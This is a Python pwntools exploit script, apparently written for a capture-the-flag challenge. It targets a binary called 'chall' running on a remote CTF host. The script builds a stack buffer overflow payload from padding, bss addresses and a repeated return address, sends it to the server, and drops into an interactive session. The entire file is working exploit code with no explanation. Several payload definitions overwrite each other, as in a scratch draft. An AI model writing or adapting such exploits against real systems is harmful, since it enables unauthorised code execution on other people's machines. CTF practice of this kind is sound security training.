#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./chall')
context.terminal = ['kitty', '-e', 'sh', '-c']
host = args.HOST or 'chall.nitdgplug.org'
port = int(args.PORT or 30622)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak main
b *0x400BC9
continue
'''.format(**locals())
call_again = 0x400B97
rip = 492
r10 = 32
rbp = 484
bss = 0x6ba580
lmao = '\x64'
context.log_level = 'warn'
for i in range(1):
    io = start()
    pop_rsp = 0x0000000000401e33
    
    payload = b"aaaabaaacaaadaaaeaaafaaagaaahaaa\xbe\xba\xfe\xca\xbe\xba\xfe\xcakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaae\x80\xa5k\x00\x00\x00\x00\x00\x97\x0b@\x00\x00\x00\x00\x00zaafbaafcaafd\xc2\x90"
    payload = 'A'*32 + 'X' * 8 + 'A' * 444 + 'X' * 8 + 'A' * 16 + 'X' * 8 + '\x90'
    payload = p64(bss) * 4 + b'X' * 8 + (p64(call_again) + p64(bss)) * 27 + b'X' * 8 + (p64(call_again) + p64(bss)) + b'X' * 8 + b'\x90'
    print(len(payload))
    print(len((p64(call_again) + p64(bss)) * 27))
    io.recv()
    print(i)
    io.send("513")
    io.recv()
    io.send(payload)
    io.interactive()

